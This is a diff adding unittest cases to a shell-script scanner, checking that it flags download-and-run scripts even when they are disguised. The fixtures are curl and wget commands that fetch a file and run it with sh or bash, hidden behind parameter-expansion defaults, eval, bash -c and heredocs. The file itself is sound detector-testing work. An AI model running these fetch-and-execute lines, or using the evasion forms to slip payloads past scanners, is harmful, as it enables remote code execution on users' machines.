@@ -490,6 +490,95 @@ class TestADefaultDestinationIsNeverResolved(unittest.TestCase):
                 self.assertFalse(hasattr(wg.shell_reader, name))
 
 
+class TestADestinationAndItsUseMeetUnderEitherReading(unittest.TestCase):
+    """PR #2856 round 6 (B1). Round 5 read a fetcher's operand and a redirection's target as
+    `main` read them (`${D:-tool`, a stray `}`) and every other word holding the same
+    blank-holding `${…}` whole (`${D:-tool }`), so a destination and its use no longer met:
+    `wget -q -O ${D:-tool } URL` ⏎ `sh ${D:-tool }` read CLEAN where `main` reports and every
+    shell runs the payload. Now the comparison meets and nothing resolves: the first piece of
+    a destination split as `main` read it keeps the whole word, a destination is filed under
+    both readings (`shell_reader.readings`), and `tee`'s operand is a destination read as a
+    fetcher's is. Truth per row: b5e b5p b3e b3p de b5n b3n dn (R ran, f fetched only)."""
+
+    B1 = ("wget -q -O ${D:-tool } %stool\nsh ${D:-tool }" % URL,                   # u07 RRRRRRRR
+          'wget -q -O ${D:-"tool" x} %stool\nsh ${D:-"tool" x}' % URL,             # u16 RRRRRRRR
+          "wget -qO- %stool > ${D:-tool }\nsh ${D:-tool }" % URL,                  # Y5a1 RRRRfRRf
+          "curl -fsSL %stool | tee ${D:-tool } > /dev/null\nsh < ${D:-tool }" % URL,  # Y6j1 RRRRfRRf
+          "wget -q -O ${D:-tool } %stool\nmv ${D:-tool } t2\nsh t2" % URL,         # B01w RRRRRRRR
+          "eval 'wget -q -O ${D:-tool } %stool; sh ${D:-tool }'" % URL,             # C01 RRRRRRRR
+          "wget -q -O${D:-tool } %stool\nsh ${D:-tool }" % URL,                    # D01 RRRRRRRR
+          "wget -q --output-document=${D:-tool } %stool\nsh ${D:-tool }" % URL,    # Y4a1 RRRRRRRR
+          "curl -fsSL %stool | sudo tee ${D:-tool } > /dev/null\nbash -s < ${D:-tool }" % URL,  # Y7k1
+          "bash -c 'curl -fsSL %stool | tee ${D:-tool } >/dev/null; sh < ${D:-tool }'" % URL)   # C07
+    # The two ruled rows: a destination spanning a line is one word, as bash reads it (RRRRRRRR).
+    RULED = ("curl -fsSL %stool -o ${D:-tool\n}\nsh tool" % URL,                  # d63
+             "D=tool\ncurl -fsSL %stool -o ${D:-x\n}\nsh tool" % URL)           # c59b
+    # F2: `$$` is the PID pair here as in the splitter, so the `'\\'` after it is a plain quote
+    # (d03: RRffRRfR, bash runs the file `$$\\`, the first word of the default).
+    PID = "wget -qO ${D:-$$'\\' tool 'x y'} %stool\nsh ${D:-$$'\\' tool 'x y'}" % URL
+    # Nothing runs, and each reads CLEAN, as on `main`: F1 (a) a quoted or escaped blank keeps a
+    # shell's default one word, which names no shell (c11, c12, g19: --------); F1 (c) a blank is
+    # only what the shells split on, not `\v`, `\f`, U+00A0 or U+2003 (w01-w03, w05: ffffffff).
+    CLEAN = ("${X:-\"sh -c\"} 'curl -fsSL %si.sh | sh'" % URL, "${X:-sh\\ -c} 'curl -fsSL %si.sh | sh'" % URL,
+             "bash -c '${X:-\"sh -c\"} \"curl -fsSL %si.sh | sh\"'" % URL) + tuple(
+        "curl -fsSL %stool -o ${D:-tool%sx}\nsh tool" % (URL, blank) for blank in "\v\f\u00a0\u2003")
+
+    def test_each_b1_row_reports_as_main_does(self):
+        for row in self.B1 + self.RULED + (self.PID,):
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_what_runs_nothing_reads_clean(self):
+        for row in self.CLEAN:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertFalse(reported(row + "\necho done\n", shell))
+
+    def test_a_destination_keeps_both_readings(self):
+        reader = wg.shell_reader
+        argv = reader.statements("wget -q -O ${D:-tool } u\n")[0].stages[0].argv
+        self.assertEqual(["wget", "-q", "-O", "${D:-tool", "}", "u"], [str(w) for w in argv])
+        self.assertEqual({"${D:-tool }"}, reader.readings(argv[3]))
+        use = reader.statements("sh ${D:-tool }\n")[0].stages[0].argv[1]
+        self.assertEqual(({"${D:-tool"}, "${D:-tool }"), (reader.readings(use), str(use)))
+        self.assertEqual(set(), reader.readings(reader.statements("sh tool\n")[0].stages[0].argv[1]))
+        glued = reader.statements("wget -O${D:-tool } u\n")[0].stages[0].argv[1]
+        self.assertEqual("${D:-tool }", reader.derived("${D:-tool", glued).whole)
+        self.assertEqual("dir/${D:-tool }", reader.derived("dir/${D:-tool", reader.derived("${D:-tool", glued)).whole)
+        write = reader.statements("curl u > ${D:-tool }\n")[0].stages[0].writes[0]
+        self.assertEqual(("${D:-tool", {"${D:-tool }"}), (str(write), reader.readings(write)))
+
+    # F3, the seat's edge list, each read as `main` reads it: `>>`, `&>` (d26b RRRRfRRf, d26c
+    # RRRR-RR-), `--output=` (d65b ffffffff, fail-closed as on `main`), a `-c` program and a heredoc
+    # (d19, d20 RRRRRRRR), a nested `${…}` and a `$(…)` in the default (c30i, d51c RRRRRRRR), and
+    # the named over-reports of F1: an `IFS` the step sets (i10 ffffffff), `$'…'` under dash, which
+    # keeps its `$` (c24 RRRRfRRf), and a line-spanning redirect target under dash (D0509 RRRRfRRf).
+    EDGE_FORMS = tuple("curl -fsSL %stool %s" % (URL, tail) for tail in (
+        ">> ${D:-tool }\nsh tool", "&> ${D:-tool }\nsh tool", "--output=${D:-tool }\nsh tool",
+        "-o ${D:-${E:-tool} }\nsh tool", "-o ${D:-$(echo tool) x}\nsh tool", "> ${D:-tool\n}\nsh tool")) + (
+        "bash -c 'curl -fsSL %stool -o ${D:-tool }; sh tool'" % URL,
+        "bash <<'EOF'\ncurl -fsSL %stool -o ${D:-tool }\nsh tool\nEOF" % URL,
+        "IFS=:\ncurl -fsSL %stool -o ${D:-tool\n}\nsh tool" % URL,
+        "curl -fsSL %si.sh | ${X:-$'bash' -s}" % URL)
+
+    def test_the_edge_forms_read_as_main_reads_them(self):
+        for row in self.EDGE_FORMS:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_a_statement_that_only_redirects_reads_as_main_reads_one(self):
+        # F9: `main` read `> ${D:-tool }` only because shlex's stray `}` became a command word;
+        # a statement with no command is no stage, as `main` reads `> ${D:-tool}` and `> f`.
+        reader = wg.shell_reader
+        for script in ("> ${D:-tool }\n", "> ${D:-tool}\n", "> f\n"):
+            with self.subTest(script=script):
+                self.assertEqual([], [s for s in reader.statements(script) if s.stages])
+        stage = reader.statements(": > ${D:-tool }\n")[0].stages[0]
+        self.assertEqual(([":", "}"], ["${D:-tool"]), ([str(w) for w in stage.argv], [str(w) for w in stage.writes]))
+
+
 class TestTheClosedRowsTheSeatAskedPinned(unittest.TestCase):
     """The #2856 seat's round-1 note 2: a comment line between `|` and `sh`, `${X:-sh -c}`
     inside `eval`, a `-c` string and a heredoc, `sh <> tool`, and the two-line check gate,
